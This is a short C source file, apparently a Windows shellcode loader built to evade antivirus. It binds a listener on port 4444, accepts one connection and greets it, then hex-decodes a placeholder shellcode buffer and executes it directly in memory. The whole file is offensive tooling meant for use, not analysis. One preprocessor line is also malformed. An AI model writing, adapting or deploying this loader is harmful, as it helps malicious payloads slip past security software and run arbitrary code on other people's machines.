/*
Author: Daniel Sauder
Website: http://govolution.wordpress.com
License http://creativecommons.org/licenses/by-sa/3.0/
gcc progname.c -lws2_32
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <stdlib.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32.lib"

void exec_shellcode(unsigned char *shellcode)
{
  int (*funct)();
  funct = (int (*)()) shellcode;
  (int)(*funct)();
}

// return pointer to shellcode
unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
{
  int j=0;
  shellcode=malloc((size/2));

  int i=0;
  do
  {
    unsigned char temp[3]={0};
    sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
    shellcode[j] = strtoul(temp, NULL, 16);

    i+=2;
    j++;
  } while(i<size);

  return shellcode;
}


int main (int argc, char **argv)
{
	//unsigned char *buffer;
	unsigned char *shellcode;
	unsigned char buffer[]=	"encrypted shellcode";

	WSADATA WsaDat;
	if(WSAStartup(MAKEWORD(2,2),&WsaDat)!=0)
	{
		WSACleanup();
		return 0;
	}
	
	SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(Socket==INVALID_SOCKET)
	{
		WSACleanup();
		return 0;
	}
	
	SOCKADDR_IN serverInf;
	serverInf.sin_family=AF_INET;
	serverInf.sin_addr.s_addr=INADDR_ANY;
	serverInf.sin_port=htons(4444);

	if(bind(Socket,(SOCKADDR*)(&serverInf),sizeof(serverInf))==SOCKET_ERROR)
	{
		WSACleanup();
		return 0;
	}

	listen(Socket,1);

	SOCKET TempSock=SOCKET_ERROR;
	while(TempSock==SOCKET_ERROR)
	{
		TempSock=accept(Socket,NULL,NULL);
	}
	Socket=TempSock;

	char *szMessage="Welcome to the server!\r\n";
	send(Socket,szMessage,strlen(szMessage),0);

	shutdown(Socket,SD_SEND);

	closesocket(Socket);

	WSACleanup();


	int size = sizeof(buffer);

	shellcode = decode_shellcode(buffer,shellcode,size);
	exec_shellcode(shellcode);
}
